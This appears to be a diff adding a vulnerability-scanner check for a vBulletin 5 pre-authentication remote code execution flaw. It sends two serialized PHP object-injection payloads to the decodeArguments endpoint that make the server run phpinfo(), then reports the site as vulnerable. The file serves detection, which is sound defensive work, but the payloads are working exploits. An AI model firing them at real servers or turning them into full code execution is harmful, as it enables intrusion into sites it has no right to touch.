@@ -1,0 +1,70 @@
+#include helpers.inc;
+#include reporting_helpers.inc;
+// **************************************************************************************							 
+function alert(uri, vxml, job, details)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(vxml);
+	ri.affects = uri;
+	ri.alertPath = "Scripts/" + vxml; 	
+	ri.setHttpInfo(job);
+	
+	if (details) ri.details = details;
+	addHTTPJobToCrawler(job, 1, 1);
+	
+	AddReportItem(ri);	
+}							 			
+/***********************************************************************************/
+function test_vb5_preauth_rce(dir, uri)
+{
+	//trace(uri);
+	lastJob = new THTTPJob();
+	lastJob.verb = "GET";
+	lastJob.url  = dir.url;
+	lastJob.uri  = uri + '/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2a%00db%22%3BO%3A11%3A%22vB_Database%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7Ds%3A12%3A%22%00%2a%00recordset%22%3Bi%3A1%3B%7D';
+	lastJob.execute();
+	
+	if (!lastJob.wasError && !lastJob.notFound) 
+	{
+		if (lastJob.responseStatus == 200 && lastJob.response.body.indexOf("<title>phpinfo()</title>") != -1)
+		{
+				// successful
+				alert(uri + '/ajax/api/hook/decodeArguments', 'vBulletin_5_PreAuth_RCE.xml', lastJob);
+				return true;				
+		}
+	}		
+	
+	return false;
+}
+/***********************************************************************************/
+function test_vb5_preauth_rce2(dir, uri)
+{
+    //trace(uri);
+    lastJob = new THTTPJob();
+    lastJob.addCookies = false;
+    lastJob.verb = "POST";
+    lastJob.url  = dir.url;
+    lastJob.uri  = uri + '/ajax/api/hook/decodeArguments';
+    lastJob.request.addHeader('Content-type', 'application/x-www-form-urlencoded', true);
+    lastJob.request.body = "arguments=O%3A7%3A%22vB_vURL%22%3A1%3A%7Bs%3A7%3A%22tmpfile%22%3BO%3A16%3A%22vB_View_AJAXHTML%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00content%22%3BO%3A12%3A%22vB5_Template%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00template%22%3Bs%3A10%3A%22widget_php%22%3Bs%3A13%3A%22%00%2A%00registered%22%3Ba%3A1%3A%7Bs%3A12%3A%22widgetConfig%22%3Ba%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A16%3A%22phpinfo%28%29%3Bdie%28%29%3B%22%3B%7D%7D%7D%7D%7D";
+    lastJob.execute();
+    if (!lastJob.wasError && !lastJob.notFound)
+    {
+        if (lastJob.responseStatus == 200 && lastJob.response.body.indexOf("<title>phpinfo()</title>") != -1)
+        {
+            // successful
+            alert(uri + '/ajax/api/hook/decodeArguments', 'vBulletin_5_PreAuth_RCE.xml', lastJob);
+            return true;
+        }
+    }
+    return false;
+}
+/***********************************************************************************/
+/* main */
+/***********************************************************************************/	
+var dir = getCurrentDirectory(); 
+if (dir)
+{
+    if (!test_vb5_preauth_rce(dir, dir.fullPath))
+	    test_vb5_preauth_rce2(dir, dir.fullPath);
+}
